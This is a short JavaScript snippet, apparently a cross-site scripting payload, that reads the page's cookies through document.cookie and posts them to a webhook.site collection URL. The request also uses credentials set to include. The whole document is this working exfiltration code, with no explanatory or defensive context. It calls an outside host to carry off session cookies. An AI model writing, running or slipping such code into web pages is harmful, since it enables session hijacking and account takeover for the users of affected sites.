// Send a fetch request with the domain's cookies
fetch('https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972', {
    method: 'POST',
    credentials: 'include',  // This ensures cookies are sent with the request
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      cookies: document.cookie  // Include cookies in the request body
    })
  })
  .then(response => response.json())
  .then(data => console.log('Success:', data))
  .catch((error) => console.error('Error:', error));